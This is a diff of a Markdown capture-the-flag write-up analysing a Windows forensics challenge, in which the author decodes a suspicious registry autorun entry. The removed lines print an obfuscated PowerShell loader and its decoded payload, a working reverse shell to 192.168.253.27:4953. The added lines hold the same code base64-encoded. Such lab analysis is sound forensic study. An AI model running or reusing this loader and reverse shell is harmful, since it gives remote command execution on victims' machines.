@@ -131,7 +131,7 @@ I received the `MyPhone` file. After checking the file and using the `strings` c
 
 `Description`
 
-```
+```plaintext
 Hòa đang làm báo cáo bài tập lớn để nộp cho thầy giáo thì bỗng nhiên máy tính của anh ấy bị tắt đột ngột do mất điện mà anh ấy thì chưa kịp lưu báo cáo một lần nào. Tuy nhiên sau đó, thay vì viết báo cáo mới thì Hòa đã chọn cách dành ra 4h đồng hồ để khôi phục báo cáo ban đầu từ tệp crash dump nhưng cuối cùng vẫn thất bại. Hòa thực sự đang cần trợ giúp.
 ```
 
@@ -177,22 +177,22 @@ After opening them with `Register Explorer`, I noticed a suspicious location.
 
 ![pic1](./image/cookiearenactffor/25.png)
 
-```plaintext
-"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "(neW-obJEct io.COMprEssIon.dEFlATesTReAm( [sySTem.IO.memorYSTREam] [coNVeRT]::FRoMBAse64stRInG( 'TVFva4JAGP8qh7hxx/IwzbaSBZtsKwiLGexFhJg+pMs09AmL6rvP03S9uoe739/nZD+OIEHySmwolNn6F3wkzilH2HEbkDupvwXM+cKaWxWSSt2Bxrv9F64ZOteepU5vYOjMlHPMwNuVQnItyb8AneqOMnO5PiEsVytZnHkJUjnvG4ZuXB7O6tUswigGSuVI0Gsh/g1eQGt8h6gdUo98CskGQ8aIkgBR2dmUAw+9kkfvCiiL0x5sbwdNlQUckb851mTykfhpECUbdstXjo2LMIlEE0iCtedvhWgER1I7aKPHLrmQ2QGVmkbuoFoVvOE9Eckaj8+26vbcTeomqptjL3OLUM/0q1Q+030RMD73MBTYEZFuSmUMYbpEERduSVfDYZW8SvwuktJ/33bx/CeLEGirU7Zp52ZpLfYzPuQhZVez+SsrTnOg7A8='), [SYSTEM.iO.ComPReSSion.CoMPrEsSIonmODe]::DeCOmpresS)|FOREAcH-object{ neW-obJEct io.streAMrEadeR( $_,[sysTem.TExt.EnCoDING]::asCIi )}).reaDToEnD()|inVOKe-exprEsSIon"
+```base64
+IkM6XFdpbmRvd3NcU3lzdGVtMzJcV2luZG93c1Bvd2VyU2hlbGxcdjEuMFxwb3dlcnNoZWxsLmV4ZSIgIihuZVctb2JKRWN0IGlvLkNPTXByRXNzSW9uLmRFRmxBVGVzVFJlQW0oIFtzeVNUZW0uSU8ubWVtb3JZU1RSRWFtXSBbY29OVmVSVF06OkZSb01CQXNlNjRzdFJJbkcoICdUVkZ2YTRKQUdQOHFoN2h4eC9Jd3piYVNCWnRzS3dpTEdleEZoSmcrcE1zMDlBbUw2cnZQMDNTOXVvZTczOS9uWkQrT0lFSHlTbXdvbE5uNkYzd2t6aWxIMkhFYmtEdXB2d1hNK2NLYVd4V1NTdDJCeHJ2OUY2NFpPdGVlcFU1dllPak1sSFBNd051VlFuSXR5YjhBbmVxT01uTzVQaUVzVnl0Wm5Ia0pVam52RzRadVhCN082dFVzd2lnR1N1VkkwR3NoL2cxZVFHdDhoNmdkVW85OENza0dROGFJa2dCUjJkbVVBdys5a2tmdkNpaUwweDVzYndkTmxRVWNrYjg1MW1UeWtmaHBFQ1ViZHN0WGpvMkxNSWxFRTBpQ3RlZHZoV2dFUjFJN2FLUEhMcm1RMlFHVm1rYnVvRm9Wdk9FOUVja2FqOCsyNnZiY1Rlb21xcHRqTDNPTFVNLzBxMVErMDMwUk1ENzNNQlRZRVpGdVNtVU1ZYnBFRVJkdVNWZkRZWlc4U3Z3dWt0Si8zM2J4L0NlTEVHaXJVN1pwNTJacExmWXpQdVFoWlZleitTc3JUbk9nN0E4PScpLCBbU1lTVEVNLmlPLkNvbVBSZVNTaW9uLkNvTVByRXNTSW9ubU9EZV06OkRlQ09tcHJlc1MpfEZPUkVBY0gtb2JqZWN0eyBuZVctb2JKRWN0IGlvLnN0cmVBTXJFYWRlUiggJF8sW3N5c1RlbS5URXh0LkVuQ29ESU5HXTo6YXNDSWkgKX0pLnJlYURUb0VuRCgpfGluVk9LZS1leHByRXNTSW9uIg==
 ```
 
 The command is a `powershell` script that decodes `base64`, then decompresses deflate-compressed data, and finally executes the decode result. I ran it in a simulated `PowerShell environment` for better visibility. 
 
 ![pic2](./image/cookiearenactffor/26.png)
 
-```plaintext
-$t`est = (neW-obJEct io.COMprEssIon.dEFlATesTReAm( [sySTem.IO.memorYSTREam] [coNVeRT]::FRoMBAse64stRInG( 'TVFva4JAGP8qh7hxx/IwzbaSBZtsKwiLGexFhJg+pMs09AmL6rvP03S9uoe739/nZD+OIEHySmwolNn6F3wkzilH2HEbkDupvwXM+cKaWxWSSt2Bxrv9F64ZOteepU5vYOjMlHPMwNuVQnItyb8AneqOMnO5PiEsVytZnHkJUjnvG4ZuXB7O6tUswigGSuVI0Gsh/g1eQGt8h6gdUo98CskGQ8aIkgBR2dmUAw+9kkfvCiiL0x5sbwdNlQUckb851mTykfhpECUbdstXjo2LMIlEE0iCtedvhWgER1I7aKPHLrmQ2QGVmkbuoFoVvOE9Eckaj8+26vbcTeomqptjL3OLUM/0q1Q+030RMD73MBTYEZFuSmUMYbpEERduSVfDYZW8SvwuktJ/33bx/CeLEGirU7Zp52ZpLfYzPuQhZVez+SsrTnOg7A8='), [SYSTEM.iO.ComPReSSion.CoMPrEsSIonmODe]::DeCOmpresS)|FOREAcH-object{ neW-obJEct io.streAMrEadeR( $_,[sysTem.TExt.EnCoDING]::asCIi )}).reaDToEnD()
+```base64
+JHRlc3QgPSAobmVXLW9iSkVjdCBpby5DT01wckVzc0lvbi5kRUZsQVRlc1RSZUFtKCBbc3lTVGVtLklPLm1lbW9yWVNUUkVhbV0gW2NvTlZlUlRdOjpGUm9NQkFzZTY0c3RSSW5HKCAnVFZGdmE0SkFHUDhxaDdoeHgvSXd6YmFTQlp0c0t3aUxHZXhGaEpnK3BNczA5QW1MNnJ2UDAzUzl1b2U3MzkvblpEK09JRUh5U213b2xObjZGM3dremlsSDJIRWJrRHVwdndYTStjS2FXeFdTU3QyQnhydjlGNjRaT3RlZXBVNXZZT2pNbEhQTXdOdVZRbkl0eWI4QW5lcU9Nbk81UGlFc1Z5dFpuSGtKVWpudkc0WnVYQjdPNnRVc3dpZ0dTdVZJMEdzaC9nMWVRR3Q4aDZnZFVvOThDc2tHUThhSWtnQlIyZG1VQXcrOWtrZnZDaWlMMHg1c2J3ZE5sUVVja2I4NTFtVHlrZmhwRUNVYmRzdFhqbzJMTUlsRUUwaUN0ZWR2aFdnRVIxSTdhS1BITHJtUTJRR1Zta2J1b0ZvVnZPRTlFY2thajgrMjZ2YmNUZW9tcXB0akwzT0xVTS8wcTFRKzAzMFJNRDczTUJUWUVaRnVTbVVNWWJwRUVSZHVTVmZEWVpXOFN2d3VrdEovMzNieC9DZUxFR2lyVTdacDUyWnBMZll6UHVRaFpWZXorU3NyVG5PZzdBOD0nKSwgW1NZU1RFTS5pTy5Db21QUmVTU2lvbi5Db01QckVzU0lvbm1PRGVdOjpEZUNPbXByZXNTKXxGT1JFQWNILW9iamVjdHsgbmVXLW9iSkVjdCBpby5zdHJlQU1yRWFkZVIoICRfLFtzeXNUZW0uVEV4dC5FbkNvRElOR106OmFzQ0lpICl9KS5yZWFEVG9FbkQoKQ==
 ```
 
 `result`
 
-```plaintext
-$c`lient = New-Object System.Net.Sockets.TCPClient("192.168.253.27",4953);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "CHH{N0_4_go_n0_st4r_wh3r3}" + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```base64
+JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgiMTkyLjE2OC4yNTMuMjciLDQ5NTMpOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICJDSEh7TjBfNF9nb19uMF9zdDRyX3doM3IzfSIgKyAocHdkKS5QYXRoICsgIj4gIjskc2VuZGJ5dGUgPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJHNlbmRiYWNrMik7JHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKTskc3RyZWFtLkZsdXNoKCl9OyRjbGllbnQuQ2xvc2UoKQ==
 ```
 
 Finally, we obtained the `flag` in the output. Another approach is to generate the `plaintext` using [here](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Raw_Inflate(0,0,'Adaptive',false,false)&input=VFZGdmE0SkFHUDhxaDdoeHgvSXd6YmFTQlp0c0t3aUxHZXhGaEpnK3BNczA5QW1MNnJ2UDAzUzl1b2U3MzkvblpEK09JRUh5U213b2xObjZGM3dremlsSDJIRWJrRHVwdndYTStjS2FXeFdTU3QyQnhydjlGNjRaT3RlZXBVNXZZT2pNbEhQTXdOdVZRbkl0eWI4QW5lcU9Nbk81UGlFc1Z5dFpuSGtKVWpudkc0WnVYQjdPNnRVc3dpZ0dTdVZJMEdzaC9nMWVRR3Q4aDZnZFVvOThDc2tHUThhSWtnQlIyZG1VQXcrOWtrZnZDaWlMMHg1c2J3ZE5sUVVja2I4NTFtVHlrZmhwRUNVYmRzdFhqbzJMTUlsRUUwaUN0ZWR2aFdnRVIxSTdhS1BITHJtUTJRR1Zta2J1b0ZvVnZPRTlFY2thajgrMjZ2YmNUZW9tcXB0akwzT0xVTS8wcTFRKzAzMFJNRDczTUJUWUVaRnVTbVVNWWJwRUVSZHVTVmZEWVpXOFN2d3VrdEovMzNieC9DZUxFR2lyVTdacDUyWnBMZll6UHVRaFpWZXorU3NyVG5PZzdBOD0)
@@ -211,7 +211,7 @@ decomp = zlib.decompress(debase,-15)
 
 print(decomp.decode())
 
-#$client = New-Object System.Net.Sockets.TCPClient("192.168.253.27",4953);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "CHH{N0_4_go_n0_st4r_wh3r3}" + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+#JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgiMTkyLjE2OC4yNTMuMjciLDQ5NTMpOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICJDSEh7TjBfNF9nb19uMF9zdDRyX3doM3IzfSIgKyAocHdkKS5QYXRoICsgIj4gIjskc2VuZGJ5dGUgPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJHNlbmRiYWNrMik7JHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKTskc3RyZWFtLkZsdXNoKCl9OyRjbGllbnQuQ2xvc2UoKQ==
 ```
 
 ---
